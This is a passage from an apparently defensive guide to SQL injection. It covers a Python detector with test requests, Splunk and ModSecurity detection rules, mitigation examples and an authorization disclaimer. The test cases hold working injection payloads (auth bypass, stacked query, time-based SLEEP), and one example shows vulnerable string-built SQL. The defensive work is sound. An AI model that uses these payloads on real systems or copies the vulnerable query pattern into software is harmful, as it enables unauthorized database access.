        # Get attack statistics
        cursor.execute('''
            SELECT injection_type, COUNT(*) as count, AVG(risk_score) as avg_risk
            FROM sqli_attempts
            WHERE timestamp > ?
            GROUP BY injection_type
            ORDER BY count DESC
        ''', (cutoff_time,))

        attack_stats = cursor.fetchall()

        # Get top attacking IPs
        cursor.execute('''
            SELECT source_ip, COUNT(*) as attempts, MAX(risk_score) as max_risk
            FROM sqli_attempts
            WHERE timestamp > ?
            GROUP BY source_ip
            ORDER BY attempts DESC
            LIMIT 10
        ''', (cutoff_time,))

        top_ips = cursor.fetchall()

        # Get blocked attempts
        cursor.execute('''
            SELECT COUNT(*) as blocked_count
            FROM sqli_attempts
            WHERE timestamp > ? AND blocked = 1
        ''', (cutoff_time,))

        blocked_count = cursor.fetchone()[0]

        conn.close()

        report = {
            'generated_at': datetime.now().isoformat(),
            'time_period_hours': hours,
            'attack_statistics': [
                {'type': row[0], 'count': row[1], 'avg_risk': row[2]}
                for row in attack_stats
            ],
            'top_attacking_ips': [
                {'ip': row[0], 'attempts': row[1], 'max_risk': row[2]}
                for row in top_ips
            ],
            'blocked_attempts': blocked_count
        }

        return report

# Example usage and testing
def test_detector():
    """Test the SQL injection detector"""
    detector = SQLInjectionDetector()

    # Test cases
    test_requests = [
        {
            'ip': '192.168.1.100',
            'url': '/login',
            'params': {'username': "admin' OR '1'='1'--", 'password': 'test'},
            'body': '',
            'headers': {}
        },
        {
            'ip': '192.168.1.101',
            'url': '/search',
            'params': {'q': "'; SELECT * FROM users; --"},
            'body': '',
            'headers': {}
        },
        {
            'ip': '192.168.1.102',
            'url': '/api/data',
            'params': {},
            'body': '{"id": "1\' AND SLEEP(5)--"}',
            'headers': {}
        }
    ]

    for i, request in enumerate(test_requests):
        print(f"\nTesting request {i+1}:")
        result = detector.analyze_request(request)

        if result['detected_patterns']:
            print(f"✗ SQL Injection detected from {result['source_ip']}")
            print(f"  Types: {', '.join(result['injection_types'])}")
            print(f"  Risk Score: {result['risk_score']}")
            print(f"  Should Block: {result['should_block']}")
        else:
            print(f"✓ Clean request from {result['source_ip']}")

    # Generate report
    print("\n" + "="*50)
    print("DETECTION REPORT")
    print("="*50)

    report = detector.generate_report(hours=1)
    print(json.dumps(report, indent=2))

if __name__ == "__main__":
    test_detector()
```

### Key Detection Metrics

**Behavioral Indicators:**

- **Multiple injection types from single IP**: ≥3 different techniques
- **Rapid attack pattern**: >20 attempts per minute
- **Payload sophistication**: Advanced evasion techniques
- **Response time analysis**: Delays indicating time-based attacks
- **Error pattern analysis**: Database error messages in responses

**Network Signatures:**

- **Union-based**: `UNION SELECT` statements in parameters
- **Boolean-based**: `OR 1=1`, `AND 1=1` logical operators
- **Time-based**: `SLEEP()`, `WAITFOR DELAY`, `BENCHMARK()` functions
- **Error-based**: `EXTRACTVALUE()`, `UPDATEXML()` XML functions
- **Stacked queries**: Semicolon-separated SQL statements

**Response Analysis:**

- **HTTP 500 errors** with database error messages
- **Abnormal response sizes** indicating data extraction
- **Extended response times** for time-based attacks
- **Content changes** in boolean-based attacks
- **Header modifications** revealing server information

## Detection and Monitoring

### SIEM Rules for SQL Injection Detection

```sql
-- Splunk Detection Rule
index=web_logs
| regex _raw="(?i)(union|select|insert|delete|drop|update|exec|script|javascript|vbscript)"
| regex _raw="(?i)(\s|%20)(or|and)(\s|%20).*(\s|%20)*=(\s|%20)*"
| eval sql_injection_score=0
| eval sql_injection_score=if(match(_raw,"(?i)(union|select)"),sql_injection_score+3,sql_injection_score)
| eval sql_injection_score=if(match(_raw,"(?i)(insert|delete|drop|update)"),sql_injection_score+5,sql_injection_score)
| eval sql_injection_score=if(match(_raw,"(?i)(exec|script)"),sql_injection_score+4,sql_injection_score)
| eval sql_injection_score=if(match(_raw,"(?i)(\s|%20)(or|and)(\s|%20).*="),sql_injection_score+2,sql_injection_score)
| where sql_injection_score >= 3
| stats count by src_ip, uri_path, user_agent
| sort -count
```

### WAF Rules (ModSecurity)

```apache
# SQL Injection Prevention Rules
SecRule ARGS "@detectSQLi" \
    "id:1001,\
    phase:2,\
    block,\
    msg:'SQL Injection Attack Detected',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}',\
    tag:'application-multi',\
    tag:'language-multi',\
    tag:'platform-multi',\
    tag:'attack-sqli'"

# Block common SQL injection patterns
SecRule ARGS "@rx (?i:(?:[\s'`´'']+(?:select|union|insert|update|delete|drop|create|alter|exec|execute)\s)|(?:\s(?:or|and)\s+(?:\w+\s*)?[=<>]+\s*(?:\w+|'[^']*'|\d+))|(?:(?:union|select|insert|update|delete|drop|create|alter|exec|execute)\s+(?:\*|[\w,\s]+)\s+(?:from|into|values|set|where|group|order|having|limit)))" \
    "id:1002,\
    phase:2,\
    block,\
    msg:'SQL Injection Attack Pattern Detected',\
    tag:'attack-sqli'"
```

## Mitigation Strategies

### 1. Use Parameterized Queries/Prepared Statements

```python
# Vulnerable code
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
cursor.execute(query)

# Secure code
query = "SELECT * FROM users WHERE username = ? AND password = ?"
cursor.execute(query, (username, password))
```

### 2. Input Validation and Sanitization

```python
import re
from html import escape

def validate_input(user_input, input_type="general"):
    """Validate and sanitize user input"""

    # Remove null bytes
    user_input = user_input.replace('\x00', '')

    if input_type == "username":
        # Allow only alphanumeric and underscore
        if not re.match("^[a-zA-Z0-9_]+$", user_input):
            raise ValueError("Invalid username format")

    elif input_type == "email":
        # Basic email validation
        if not re.match(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", user_input):
            raise ValueError("Invalid email format")

    # HTML escape for output
    return escape(user_input)
```

### 3. Database Security Configuration

```sql
-- Create limited privilege user for application
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE ON app_database.* TO 'app_user'@'localhost';
FLUSH PRIVILEGES;

-- Remove dangerous stored procedures
DROP PROCEDURE IF EXISTS xp_cmdshell;
DROP PROCEDURE IF EXISTS sp_OACreate;
```

## Legal and Ethical Considerations

⚠️ **IMPORTANT DISCLAIMERS:**

1. **Authorization Required**: Only test applications you own or have explicit written permission to test
2. **Scope Limitations**: Stay within the defined scope of testing
3. **Data Protection**: Do not access, modify, or exfiltrate real user data
4. **Responsible Disclosure**: Report vulnerabilities through proper channels
5. **Legal Compliance**: Ensure testing complies with local laws and regulations

## References

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [SQLMap User Manual](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
- [NIST SP 800-53 Security Controls](https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)

---

**Last Updated**: May 27, 2025  
**Version**: 1.0  
**Classification**: Internal Use Only
